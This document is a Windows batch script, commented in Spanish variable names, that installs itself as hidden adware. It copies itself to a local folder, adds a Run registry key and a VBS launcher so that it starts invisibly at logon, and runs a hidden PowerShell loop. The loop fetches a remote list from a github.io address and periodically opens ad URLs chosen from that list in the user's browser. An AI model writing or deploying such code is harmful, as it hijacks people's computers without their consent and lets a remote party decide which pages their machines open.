@echo off
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"
set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=RotadorAdsPS"

if /i "%~1"=="--uninstall" (
    reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1
    powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*RotadorAdsMutex*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
    rmdir /s /q "%CARPETA_ADS%" >nul 2>&1
    exit
)

if not exist "%CARPETA_ADS%" (
    mkdir "%CARPETA_ADS%" >nul 2>&1
)

if /i not "%~f0"=="%BAT_DESTINO%" (
    copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
    reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
    if %errorlevel% neq 0 (
        reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "wscript.exe //B //Nologo \"%CARPETA_ADS%\oculto.vbs\"" /f >nul
    )
)

set "VBS_LAUNCHER=%CARPETA_ADS%\oculto.vbs"
if not exist "%VBS_LAUNCHER%" (
    > "%VBS_LAUNCHER%" echo Set WshShell = CreateObject("WScript.Shell")
    >> "%VBS_LAUNCHER%" echo WshShell.Run "cmd.exe /c """"%BAT_DESTINO%""""", 0, False
)

if /i not "%~f0"=="%BAT_DESTINO%" (
    wscript.exe //B //Nologo "%VBS_LAUNCHER%"
    exit
)

set "PS_LOOP=$created = $false; $mutex = New-Object System.Threading.Mutex($true, 'Global\RotadorAdsMutex', [ref]$created); if (-not $created) { exit }; while ($true) { $espera = 3600; try { $nocache = 'https://browsergx.github.io/ads/ads.txt?t=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $resp = Invoke-WebRequest -Uri $nocache -UseBasicParsing -TimeoutSec 15; $lineas = $resp.Content -split \"`r?`n\"; $actLine = $lineas | Where-Object { $_ -match '^\s*activo\s*=\s*[01]\s*$' } | Select-Object -First 1; $activo = $true; if ($actLine) { $activo = (([int]($actLine -split '=')[1].Trim()) -eq 1) }; $intLine = $lineas | Where-Object { $_ -match '^\s*interval\s*=\s*\d+\s*$' } | Select-Object -First 1; if ($intLine) { $val = [int]($intLine -split '=')[1].Trim(); if ($val -ge 10) { $espera = $val } }; if ($activo) { $urls = @($lineas | ForEach-Object { $_.Trim() } | Where-Object { $_ -match '^https?://' }); if ($urls.Count -gt 0) { $idx = Get-Random -Minimum 0 -Maximum $urls.Count; $elegida = $urls[$idx]; if (-not [string]::IsNullOrWhiteSpace($elegida)) { $encoded = [uri]::EscapeDataString($elegida); $destino = 'https://browsergx.github.io/ads/go.html?url=' + $encoded; Start-Process -FilePath $destino } } }; Start-Sleep -Seconds $espera } catch { Start-Sleep -Seconds $espera } }"

powershell.exe -NoProfile -WindowStyle Hidden -Command "%PS_LOOP%"
exit
